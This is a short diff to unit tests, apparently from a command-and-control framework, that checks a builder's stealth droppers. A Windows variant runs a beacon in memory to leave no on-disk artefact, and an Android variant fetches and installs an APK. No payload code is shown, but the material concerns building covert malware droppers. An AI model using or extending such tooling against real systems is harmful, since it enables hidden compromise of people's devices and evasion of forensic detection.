@@ -66,9 +66,12 @@ class RemoteDropperTests(unittest.TestCase):
         """Windows delegates to the PIC stager: the beacon runs fully in
         memory, so there is no on-disk beacon file to delete."""
         from phantom.utils.builder import generate_stealth_dropper, generate_dropper
+        # the stealth contract is "no artefact left behind", so it is the
+        # explicit one-shot form (resilient=False), never the default
         self.assertEqual(generate_stealth_dropper("windows", "10.0.0.5", 8443),
                          generate_dropper("windows", "10.0.0.5", 8443,
-                                          dl_port=8443, use_ssl=True))
+                                          dl_port=8443, use_ssl=True,
+                                          resilient=False))
 
     def test_android_dropper_installs_apk(self):
         """Android is supported: the dropper fetches the APK, installs it and
